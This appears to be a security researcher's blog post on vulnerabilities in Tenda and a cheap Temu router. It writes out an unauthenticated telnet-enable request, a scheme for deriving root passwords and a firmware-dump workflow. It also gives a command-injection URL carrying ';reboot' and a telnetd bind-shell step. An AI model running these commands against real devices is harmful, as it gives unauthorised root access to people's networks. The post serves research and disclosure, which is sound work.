+++
title = "Tenda, Temu, and the Root Password Printed on the Serial Console"
date = "2026-08-03"
+++

A Tenda AC10 V6 bought off Amazon turned out to have a bug so dumb it deserved verification. The exercise ended with the entire firmware image decrypted using keys harvested from a factory reset. It's the best argument I've seen in months for why consumer router security is where it is.

## The roadblock chain

Recon first. One researcher's repo on the AC18 alone documents, by my count from the markdown filenames, well over a dozen separate bugs. Each is independently able to reach code execution. Ten years of this pattern, a new "Tenda accidentally left in a backdoor" story every couple of years. So the baseline expectation isn't whether there's a bug. It's which flavor.

The `/goform/telnet` bug on the AC20 is my new benchmark for shameless. Visiting a URL `http://<router>/goform/telnet`, no authentication, turns telnet on. That's it. That's the feature. Verified on his box: curl the endpoint, telnet flips from refused to listening. Which leaves one problem: the telnet has a root password, and the root password's hash lives in the shadow file of firmware that Tenda started encrypting in this hardware generation.

## The password scheme

The AC8 generation's scheme leaked well enough to be public: take the last two bytes of the router's MAC address, available free with an ARP request, concatenate them in swapped order against a magic string, base64 the result, that's the root password.

```text
MAC:            xx:xx:xx:xx:NC:00        # from `arp -a`, free
magic string:   NC00                     # per-generation secret
build:          base64( magic[0:2] + mac[-2] + mac[-1] )
                → the root password
```

Except the AC10 V6 didn't take it. Reading the writeup explains why: the magic string is per-device-line and only Tenda knows it. Different string, unreachable, firmware encrypted so you can't extract it. Circular problem: the password needs a string, the string needs the firmware, the firmware needs the password.

## The break

The break is the kind I love, because it's not an exploit at all. It's a reading-comprehension bug. Ask: what does the device *do with* the password after building it? It prints it. Routers don't have screens, but the SoC has serial console pads right there on the PCB. The console is enabled, streaming every kernel and userspace line as usual.

So: attach a serial tap, hold the factory reset button, and watch boot. During re-provisioning the device logs the pre-base64 password material, and then, because Tenda, the base64-encoded result right after it. Root password, caught live. And with root on the device came `decrypt_firmware`, the binary holding the keys to the encrypted image. Ed's now got the firmware keys for the whole generation, pending a lawyer conversation before publishing them.

```bash
# the whole attack, in commands:
curl http://192.168.0.1/goform/telnet     # enable telnet, no auth
arp -a                                     # get router MAC, free
# serial tap on PCB pads → screen output
# hold reset → watch boot log catch:
#   "step 1" + pre-b64 password + b64-encoded root password
telnet 192.168.0.1
# root / <that password> → shell (BusyBox, no id/uname applets)
```

## The Temu device, and why I love this workflow

The earlier $5 Temu router shows the full research loop that this community keeps proving out. It maps to how I'd want any junior to learn firmware work:

```bash
# 1. firmware dump without a screwdriver touching a flash chip
#    (device has a "firmware backup" page in its CN-language web UI)
curl http://192.168.1.1/... -o full.bin
binwalk -e full.bin          # squashfs falls out
# 2. find the request handler
#    network tab shows: POST protocol.csp?fname=net&option=wizard_config
grep -r "protocol.csp" squashfs-root/   # → lighttpd proxy.conf → port 81
grep -r "wizard_config" squashfs-root/  # → commuos binary (the web server)
# 3. Ghidra: strings → wizard_config cross-ref → dispatch table
#    (array of {char* name, void (*handler)()})
# 4. read time_config handler:
#    get_param(request, "time") → sprintf(time_buf, "date %s", t)
#    → system(time_buf)     ← there it is
# 5. verify:
curl 'http://192.168.1.1/protocol.csp?fname=net&option=time_config&time=x;reboot&fnc=set&<stolen token>'
#    device reboots = command injection confirmed
```

The `date %s` handler takes a URL parameter, `sprintf`s it into a buffer, and `system()`s it. The wrapper was presumably supposed to sanitize. Testing that assumption costs one curl. From there the pivots are all classic: `ps` output written into `/webs` (the lighttpd docroot, writable) and read back with `curl hehe` for a process dump; `telnetd` with `-p 4444 -l /bin/ash` as a bind shell, which half-worked around an IFS quirk by instead abusing the device's own `upload.cgi`, the firmware-upload handler, to plant a script in `/tmp/firmware`, `chmod +x`, execute, netcat, root.

The disclosure ending is the part that should bother regulators more than it does: he couldn't identify a vendor to tell. No company, no PSIRT, nothing. A vulnerability with no owner gets published, correctly. The supply chain produced the bug and then dissolved when it came time to fix it.

## The pattern that keeps repeating

Firmware encryption on a router isn't security, it's an admission. You encrypt when you have something to hide, occasionally a legitimate IP concern, usually backdoor passwords. The Tenda pattern is a decade long and counting. Every break follows the same shape: not a clever memory-corruption, but a design so bad the firmware tells you the answer on a console tap. The practical defense hasn't changed since the first backdoor story: if you ship consumer networking gear with any credential material derived from secrets *stored on the same device as the credential*, you've built a self-defeating scheme. Someone with a $10 UART adapter and a free afternoon will prove it.
